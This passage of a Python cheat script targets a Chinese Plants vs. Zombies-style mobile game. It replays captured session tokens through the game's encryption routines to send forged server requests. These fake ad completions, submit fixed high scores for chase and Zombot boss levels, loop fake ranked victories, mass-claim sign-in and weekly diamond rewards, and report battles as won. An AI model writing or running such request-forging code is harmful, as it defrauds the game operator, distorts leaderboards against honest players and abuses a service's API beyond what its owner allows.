            pl_all = [2, 1, 3, 13, 6, 11, 27, 35, 5, 20, 16, 15, 38, 39, 22, 23, 33, 10, 21, 18, 19, 24, 9, 7, 25, 32, 14, 37, 4, 17, 34, 8, 43, 44, 42, 45, 26, 12, 31, 30, 29, 40, 28, 41, 47, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 49, 50, 63, 70, 73, 66, 67, 68, 69, 64, 71, 72, 65, 74, 75, 76, 77, 78, 79, 80, 81, 82, 302, 83, 84, 300, 303, 85, 86, 87, 88, 89, 90, 91, 305, 306, 307, 309, 308, 310, 311, 93, 95, 96, 97, 98, 99, 312, 100, 313, 314, 315, 316, 317, 318, 319, 320, 101, 102, 103, 104, 105, 106, 108, 321, 107, 322, 323, 324, 109, 110, 111, 112, 113, 114, 115, 325, 326, 327, 328, 329, 330, 331, 332, 116, 117, 118, 119, 120, 121, 122, 124, 333, 334, 335, 336, 125, 126, 127, 128, 129, 130, 131, 338, 339, 337, 340, 341, 342, 344, 345, 347, 348, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 399, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 440, 441, 442, 443, 444, 446, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460]
            pi1_value = []
            for item in decrypted_json["e"]["d"]["ep"]:
                pi1_value.append(int(item['pi1']))
            filtered_pl_all = [x for x in pl_all if x not in pi1_value]
            first_15 = filtered_pl_all[:15]
            pl_lists = [first_15[0:5],first_15[5:10],first_15[10:15]]
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("探险成功")
            else:
                print("探险失败")
            data = {"req": "V281", "e": {"ic": "0",  "pi":pi, "pl": pl_lists[j], "sk": sk,  "ui":ui, "wi": wi_value}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            r_value = decrypted_json['r']
            if r_value!= 0:
                print("领取失败，跳出循环")
                break
            else:
                if 'e' not in decrypted_json["e"]["d"]:
                    print("缺少 'e' 字段，跳出循环")
                    break
                d_value = int(decrypted_json["e"]["d"]["e"][0]["b"])
                if is_specified:
                    if d_value == 1:
                        data = {"req": "V282", "e": {"f": "0", "is": "0", "pi":pi, "sk": sk,  "ui":ui, "wi": wi_value}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("探险碎片个数为1，重置开始")
                        else:
                            print("取消探险失败")
                    elif d_value == 2:
                        print("满足条件，跳出循环")
                        break
                else:
                    if d_value == 0:
                        data = {"req": "V282", "e": {"f": "0", "is": "0", "pi":pi, "sk": sk,  "ui":ui, "wi": wi_value}, "ev": 3}
                        encrypted_data, head = get_encrypted_data(data, url)
                        response = _do_post(head, encrypted_data, data)
                        response_data = json.loads(response.text)
                        if response_data.get("r") == 20013:
                            print("当前请求文本已过期，需重新抓包")
                        elif response_data.get("r") == 0:
                            print("探险碎片个数为1，重置开始")
                        else:
                            print("取消探险失败")
                    elif d_value == 1:
                        print("满足条件，跳出循环")
                        break
        time.sleep(0)
        data = {"req": "V282", "e": {"f": "5", "is": "0", "pi":pi, "sk": sk,  "ui":ui, "wi": wi_value}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("探险广告完成成功")
        else:
            print("探险广告完成失败")
        time.sleep(0)
        data = {"req": "V283", "e": {"ad": "1",  "pi":pi, "sk": sk,  "ui":ui, "wi": wi_value}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("探险翻倍成功")
        else:
            print("探险翻倍失败")
def run_third_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req":"V303","e":{"al":[{"id":10704,"abi":0,"type":1,"config_version":1}],"ci":"93","cs":"0","pack":渠道,"pi":pi,"sk":sk,"ui":ui,"v":版本号},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = decrypted_response.replace('\\','')
    matches_n = re.findall(r'"n":"([^"]+)"', decrypted_json)
    matches_s = re.findall(r'"s":(\d+)', decrypted_json)
    if matches_n and matches_s:
        for n_value, s_value in zip(matches_n, matches_s):
            unicode_n_value = ''.join([chr(int(x, 16)) for x in re.findall(r'u([0-9a-fA-F]{4})', n_value)])
            print(f'n: {unicode_n_value}, 奖杯数: {s_value}')
    else:
        print("未找到匹配的 n 或 s 值")
    print()
    decrypted_json = json.loads(decrypted_response)
    e_dict = decrypted_json.get('e', {})
    d_list = e_dict.get('d', [])
    if d_list:
        d_item = d_list[0]
        data_str = d_item.get('data', '{}')
        data_dict = json.loads(data_str)
        t_value = data_dict.get('t')
        print(f" 当前用户超Z钥匙数量: {t_value}")
    else:
        print("未找到 't' 列表中的元素")
    while True:
        choice = input("是否要进行对战？(输入回车对战，输入1结束程序)：").strip()
        if choice == '1':
            print("程序已结束")
            break
        data = {"req": "V380", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("超Z开始挑战成功")
            data ={"req": "V381", "e": {"cp": "1034", "lfs": "83500", "pi": pi, "pr": {"pl": [{"i": 111038, "q": 5}, {"i": 111019, "q": 3}, {"i": 1030, "q": 5}, {"i": 1019, "q": 4}, {"i": 111035, "q": 5}, {"i": 1009, "q": 4}]}, "r": "MDAwMDEyMzgwTS4uLi4uUS5JLi5YM2suLjItLjMuRTMuRS4uaC1FLS5JLi4yLlVQLi4uLi4uLmtwclguLi4uVXouLi4yaUFFLS4uLjY5Mi4uRWdOLjMuLi5hNkYuLlVXWS5JLi4uNnAyLS4uaXEuRS0uLlVoSDIuLnNLLS4zLi4uSkhGLi4ub1cuSS4uLlFFMy0uLlktLUUtLi42LksyLi5jQlQuMy4uLkJNRi4uLkstLUkuLi4wdDMtLi5nZjJFLS4uRWJMMi4uRTk2LjMuLmtUVUYuLi5ldy1JLi4uODY0LS4ud2wyRS0uLi5lTTIuLi5LUi4zLi5FR1lGLi4uNnguSS4uLnBKNC0uLklELUUtLi5JUE8yLi4uLjIuMy4uTWtkRi4uVXJULUkuLi42ZjQtLi40bC1FLS4uNHVPMi4uTWVELjMuLjZJZ0YuLi5EYi5JLi5Vd3A0LS4uVW8xRS0uLmdQUDIuLk1lMS4zLi4ucGhGLi4ud20uSS4uVWJ5NC0uLmtULkUtLi5HLlEyLi4uSS0uMy4uRTJrRi4uVVlMMEkuLmtYLjUtLi4wcDVFLS4uZDZRMi4ua0RGLjMuLlFza0YuLi5DTC1JLi4ucjE1LS4uU1YzRS0uLmZjUTIuLjZzUy4zLi4uNG5GLi5VMnQuSS4uLmJBNS0uLmlMNUUtLi42clEyLi5rQk4uMy4ua0lvRi4ua0tPMEkuLi5TRzUtLi5zUThFLS4ubzhSMi4uTW1uLjMuLjZPcEYuLi40Mi5JLi5VMEw1LS4udUUyRS0uLjRSUjIuLlU3Ri4zLi42S3FGLi4udzUuSS4uVTNPNS0uLlF2NEUtLi5HZFIyLi5zVFQuMy4uZ2xyRi4uLmNVLUkuLlVOVDUtLi5BUTBFLS4uNjNTMi4uc3oxLjNVLk1Lc0YuLi42VC1JLi5VNFc1LS4uMlc0RS0uLnVEUzIuLi5CTS4zLi42NXRGLi5VSi0tSS4uLm5ZNS0uLi5xMUUtLi5lSFMyLi4ubUcuMy4uMmF0Ri4uLjdOLUkuLk1sYzUt", "s": "1", "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("超Z赢得胜利成功")
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                a_list = decrypted_json['e']['d']['a']
                reward_list = []
                for item in a_list:
                    i_value = str(item.get('i', ""))
                    q_value = item.get('q', 0)
                    plant_info = formatted_plant.get(
                        i_value,
                        {"name": f"未知物品({i_value})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}×{q_value}\n")
            else:
                print("超Z赢得胜利失败")
        else:
            print("超Z开始挑战失败")
def run_fourth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10859, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("双人状态更新成功")
    else:
        print("双人状态更新失败")
    data_str = decrypted_json['e']['d'][0]['data']
    data_dict = json.loads(data_str)
    grade = data_dict['pf']['grade']
    big = grade['big']
    small = grade['small']
    star = grade['star']
    big_rank_mapping = {0: "铜锅", 1: "银锅", 2: "金锅", 3: "钻锅", 4: "大师锅", 5: "宗师锅"}
    big_rank = big_rank_mapping[big]
    small_rank_mapping = {0: "V", 1: "IV", 2: "III", 3: "II",4: "I"}
    small_rank = small_rank_mapping[small]
    star_count = star
    print(f"  当前段位：{big_rank}{small_rank}  {star_count}星")
    result = 100 - big * 20 - small * 5 - star
    for _ in range(result):
        data ={"req": "V826", "e": {"bot": "1", "botTimes": "1", "pi": pi, "sk": sk, "ui": ui, "win": "1"}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        time.sleep(0.25)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("双人排位胜利")
        else:
            print("双人排位失败")
            break
def run_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10836, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("回忆状态更新成功")
        data_str = json.loads(decrypted_json['e']['d'][0]['data'])
        gcl_list = []
        bossReward_list = []
        for idx, item in enumerate(data_str.get('gcl', [])):
            if item != [1, 1, 1]:
                gcl_list.append(idx)
        for gi_1 in gcl_list:
            data = {"req":"V971","e":{"gl":gi_1,"pi":pi,"r":"0","sk":sk,"tgt":"0,1,2","tp":"1","ui":ui,"wi":"1"},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("回忆之旅简单模式成功")
            else:
                print("回忆之旅简单模式失败")
        for idx, item in enumerate(data_str.get('bossReward', [])):
            if item.get('own') == 0:
                bossReward_list.append(idx)
        for gi_2 in bossReward_list:
            data = {"req": "V971", "e": {"gl": gi_2, "pi": pi, "r": "0", "sk": sk, "tgt": "0,1,2", "tp": "2", "ui": ui, "wi": "1"}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("回忆之旅困难成功")
            else:
                print("回忆之旅困难失败")
    else:
        print("回忆状态更新失败")
def run_sixth_script():
    print("  先执行广告获取追击电池...")
    current_battery = run_twenty_fourth_script()
    pi, ui, sk = get_pi_sk(加密)

    data = {"req":"V933","e":{"pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response1 = _do_post(head, encrypted_data, data)
    decrypted_response1 = get_decrypted_data(url, data=response1)
    decrypted_json1 = json.loads(decrypted_response1)
    lb_data = decrypted_json1["e"]["d"]["lb"]

    current_total = 0
    my_ui_str = str(ui)
    for item in lb_data:
        is_me = False
        for key, value in item.items():
            if key not in ('n', 's') and str(value) == my_ui_str:
                is_me = True
                break
        if is_me:
            current_total = int(item.get('s', 0))
            break
    if current_total >= 140000:
        print(f"{C.Y}当前总分已达 {current_total}，超过14w，停止刷分{C.R}")
        print()
        print("===== 领取每周七百钻 =====")
        try:
            run_seventh_script()
        except Exception as e:
            print(f"领取每周七百钻出错: {e}")
        return
    print(f"当前总分：{current_total}，未超过14w，继续刷分")

    if current_battery < 25:
        need_buy = 25 - current_battery
        need_buy = ((need_buy + 4) // 5) * 5
        print(f" 电池数量{current_battery}不足25，自动购买{need_buy}个")
        try:

            data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            uk_value = int(decrypted_json['e']['d']['p']['uk'])
            uki = uk_value + 1

            data = {"req": "V209", "e": {"is": "0", "oi": "52304", "pi": pi, "q": need_buy, "si": "1", "sk": sk, "ui": ui, "uk": uki}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print(f" 购买成功，购买数量：{need_buy}")
            else:
                print(f" 购买失败，r={response_data.get('r')}")
        except Exception as e:
            print(f" 购买电池出错: {e}")

    v_value = [15123, 15123, 15123, 15123, 30000]
    iii_value = [18123, 18123, 22500]
    total_score = sum(v_value) + sum(iii_value)
    print(f"固定刷分总分：{total_score}")
    print(f"1-5关分数：{v_value}")
    print(f"僵博1-3关分数：{iii_value}")
    continue_brush = True
    if continue_brush:
        for i in range(5):
            l_value = i + 1
            s_value = v_value[i]
            data = {"req": "V927", "e": {"fr": {"t": "1", "l": l_value, "g": "3", "s": s_value, "r": "1", "b": "1.000000"}, "g": "1", "on": "02f80dedd5ca4450801d951ceaee65e7", "pi": pi, "pr": {"pl": [{"i": 1003, "q": 4}, {"i": 1030, "q": 4}, {"i": 111029, "q": 2}, {"i": 1040, "q": 4}, {"i": 1002, "q": 4}, {"i": 1024, "q": 4}, {"i": 1001, "q": 4}]}, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print(f"第{i+1}/5关追击刷分成功")
            else:
                print(f"第{i+1}/5关追击刷分失败")
        for i in range(3):
            L_value = i + 1
            G_value = i + 1
            S_value = iii_value[i]
            data = {"req": "V927", "e": {"fr": {"t": "2", "l": L_value, "g": G_value, "s": S_value, "r": "1", "b": "2.000000"}, "g": "1", "on": "", "pi": pi, "pr": {"pl": [{"i": 1052, "q": 1}, {"i": 111040, "q": 4}, {"i": 111038, "q": 5}, {"i": 111019, "q": 2}, {"i": 1030, "q": 5}, {"i": 1022, "q": 4}, {"i": 111035, "q": 5}]}, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print(f"僵博第{i+1}关挑战成功")
            else:
                print(f"僵博第{i+1}关挑战失败")

    print("===== 刷分完成 =====")

    data = {"req": "V303", "e": {"al": [{"id": 10800, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("追击更新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        data_dict = json.loads(decrypted_json['e']['d'][0]['data'])
        l = int(data_dict['l'])
        level_info = {1: ("原木", "\033[33;4m"),2: ("砖块", "\033[31m"),3: ("黑铁", "\033[37;2m"),4: ("青铜", "\033[38;5;214m"),5: ("白银", "\033[37;1m"),6: ("黄金", "\033[33;1m"),7: ("钻石", "\033[38;5;33;1m"),8: ("传奇", "\033[31;1m")}
        name, color = level_info.get(l, ("未知", "\033[0m"))
        reset_color = "\033[0m"
        lms_list = data_dict['lms']
        print("当前关卡最高分数：")
        for i, level in enumerate(lms_list, start=1):
            max_value = max(int(item) for item in level)
            print(f"第{i}关：{max_value}")
        bms_list = data_dict['bms']
        print("僵博关卡分数：")
        for i, score in enumerate(bms_list, start=1):
            print(f"僵博第{i}关：{score}")
        print(f"{color}当前为{name}段位{reset_color}")

    print("===== 领取每周七百钻 =====")
    try:
        run_seventh_script()
    except Exception as e:
        print(f"领取每周七百钻出错: {e}")

def run_seventh_script():
    for i in range(3):
        pi, ui, sk = get_pi_sk(加密)
        data = {"req": "V965", "e": {"is": i, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("领取成功")
        else:
            print("领取失败")

def run_buy_battery():
    pi, ui, sk = get_pi_sk(加密)
    print("===== 钻石购买电池 =====")

    data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    current_battery = decrypted_json['e']['d']['p'].get('f', 0)
    print(f"当前电池数量: {current_battery}")
    while True:
        num = input("请输入购买数量（5的倍数）：")
        if num.isdigit() and int(num) % 5 == 0:
            q_value = int(num)
            break
        print("数量需为5的倍数，请重新输入")
    uk_value = decrypted_json['e']['d']['p']['uk']
    uk_value = int(uk_value)
    uki = uk_value + 1
    data = {"req": "V209", "e": {"is": "0", "oi": "52304", "pi": pi, "q": q_value, "si": "1", "sk": sk, "ui": ui, "uk": uki}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print(f"购买成功，购买数量：{q_value}")
    else:
        print(f"购买失败，r={response_data.get('r')}")

def run_eighth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10800, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    z_value = 0
    f_value = 0
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("追击更新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        bst_utc_ts = int(json.loads(decrypted_json['e']['d'][0]['data'])['bst'])
        while True:
            if select.select([sys.stdin], [], [], 0.1)[0]:
                input_str = sys.stdin.readline()
                if input_str.strip() == "":
                    sys.stdout.write("\r\n")
                    sys.stdout.flush()
                    break
            diff = bst_utc_ts - time.time()
            if diff <= 0:
                sys.stdout.write("\r僵博休息倒计时：已结束！\n")
                sys.stdout.flush()
                break
            h, m, s = int(diff//3600), int((diff%3600)//60), int(diff%60)
            sys.stdout.write(f"\r僵博休息倒计时(回车跳过)：{h:02d}时{m:02d}分{s:02d}秒")
            sys.stdout.flush()
            time.sleep(1)
        e_dict = decrypted_json.get('e', {})
        d_list = e_dict.get('d', [])
        if d_list:
            d_item = d_list[0]
            data_str = d_item.get('data', '{}')
            data_dict = json.loads(data_str)
            f_value = int(data_dict.get('f', 0))
            z_value = int(data_dict.get('z', 0))
            print(f" 当前电池数量: {f_value}")
            print(f" 当前僵博能量值: {z_value}%")
        else:
            print("未找到 'd' 列表中的元素")
    else:
        print("追击更新失败")
    print()
    required_energy = 100 - z_value
    if required_energy > 0:
        loop_count = (required_energy + 29) // 30
        loop_count = min(loop_count, 4)
    else:
        loop_count = 0
    if z_value < 100:
        print("僵博能量未满，执行刷取能量方案")
        choice = input("是否要看电池广告？(输入1看广告，输入2直接运行，回车结束程序)：").strip()
        if choice == '1':
            for i in range(2):
                data = {"req": "V765", "e": {"id": "5", "pi": pi, "sk": sk, "ui": ui, "ver_": 版本号}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print(f"第{i+1}/2次看广告成功")
                    f_value += 5
                else:
                    print(f"第{i+1}/2次看广告失败")
                    break
            actual_loop = 0
            while actual_loop < loop_count and f_value >= 5 and z_value < 100:
                data = {"req": "V927", "e": {"fr": {"t": "1", "l": "5", "g": "3", "s": "0", "r": "1", "b": "1.000000"}, "g": "1", "on": "02f80dedd5ca4450801d951ceaee65e7", "pi": pi, "pr": {"pl": [{"i": 1003, "q": 4}, {"i": 1030, "q": 4}, {"i": 111029, "q": 2}, {"i": 1040, "q": 4}, {"i": 1002, "q": 4}, {"i": 1024, "q": 4}, {"i": 1001, "q": 4}]}, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                    break
                elif response_data.get("r") == 0:
                    z_value += 30
                    f_value -= 5
                    actual_loop += 1
                    print(f"第{actual_loop}/{loop_count}次刷能量成功，当前能量: {z_value}%，剩余电池: {f_value}")
                else:
                    print(f"第{actual_loop+1}/{loop_count}次刷能量失败")
                    break
            print(f"能量刷取完成，当前能量: {z_value}%，剩余电池: {f_value}")
        elif choice == '2':
            actual_loop = 0
            while actual_loop < loop_count and f_value >= 5 and z_value < 100:
                data = {"req": "V927", "e": {"fr": {"t": "1", "l": "5", "g": "3", "s": "0", "r": "1", "b": "1.000000"}, "g": "1", "on": "02f80dedd5ca4450801d951ceaee65e7", "pi": pi, "pr": {"pl": [{"i": 1003, "q": 4}, {"i": 1030, "q": 4}, {"i": 111029, "q": 2}, {"i": 1040, "q": 4}, {"i": 1002, "q": 4}, {"i": 1024, "q": 4}, {"i": 1001, "q": 4}]}, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                    break
                elif response_data.get("r") == 0:
                    z_value += 30
                    f_value -= 5
                    actual_loop += 1
                    print(f"第{actual_loop}/{loop_count}次刷能量成功，当前能量: {z_value}%，剩余电池: {f_value}")
                else:
                    print(f"第{actual_loop+1}/{loop_count}次刷能量失败")
                    break
            print(f"能量刷取完成，当前能量: {z_value}%，剩余电池: {f_value}")
        else:
            print("程序已结束")
    if z_value >= 100:
        for i in range(3):
            data = {"req": "V927", "e": {"fr": {"t": "2", "l": i+1, "g": i+1, "s": "0", "r": "1", "b": "2.000000"}, "g": "1", "on": "", "pi": pi, "pr": {"pl": [{"i": 1052, "q": 1}, {"i": 111040, "q": 4}, {"i": 111038, "q": 5}, {"i": 111019, "q": 2}, {"i": 1030, "q": 5}, {"i": 1022, "q": 4}, {"i": 111035, "q": 5}]}, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
                break
            elif response_data.get("r") == 0:
                print(f"第{i+1}/3次僵博挑战成功")
            else:
                print(f"第{i+1}/3次僵博挑战失败")
                break
    else:
        if z_value < 100:
            print("僵博能量未达标（<100%），不执行挑战程序")

    print()
    print("===== 领取每周七百钻 =====")
    try:
        run_seventh_script()
    except Exception as e:
        print(f"领取每周七百钻出错: {e}")
def run_twenty_fourth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10800, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("追击更新成功")
    else:
        print("追击更新失败")
    for i in range(2):
        data =  {"req": "V765", "e": {"id": "5", "pi": pi, "sk": sk, "ui": ui, "ver_": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("追击电池看广告成功")
        else:
            print("追击电池看广告失败")
            break
    data = {"req": "V303", "e": {"al": [{"id": 10800, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    e_dict = decrypted_json.get('e', {})
    d_list = e_dict.get('d', [])
    if d_list:
        d_item = d_list[0]
        data_str = d_item.get('data', '{}')
        data_dict = json.loads(data_str)
        f_value = int(data_dict.get('f', 0))
        z_value = data_dict.get('z')
        print(f" 当前电池数量: {f_value}")
        print(f" 当前僵博能量值: {z_value}%")
        return f_value
    else:
        print("未找到 'd' 列表中的元素")
        return 0
def run_ninth_script():
    for i in range(31):
        pi, ui, sk = get_pi_sk(加密)
        data ={"req": "V389", "e": {"gt": "4", "hg": "1", "lc": "8", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("签到奖励领取成功")
        else:
            print("签到奖励领取失败")
            break
def run_tenth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10849, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    if decrypted_json.get("r") != 0:
        print(f"请求失败，错误码：{decrypted_json.get('r')}")
        return
    if "e" not in decrypted_json or "d" not in decrypted_json["e"] or not decrypted_json["e"]["d"]:
        print("响应数据格式异常")
        return
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        data_dict = json.loads(decrypted_json['e']['d'][0]['data'])
        excluded_names = {"uncharted_tale"}
        remaining_name = next((world["name"] for world in data_dict["world"] if world["name"] in excluded_names),None)
        target_world = next((world for world in data_dict['world'] if world['name'] in excluded_names),None)
        ez_list = [idx for idx, item in enumerate(target_world['generalInfo']) if item.get('ss') != 2]
        js_list = [idx for idx, item in enumerate(target_world['bossInfo']) if item.get('ss') == 0]
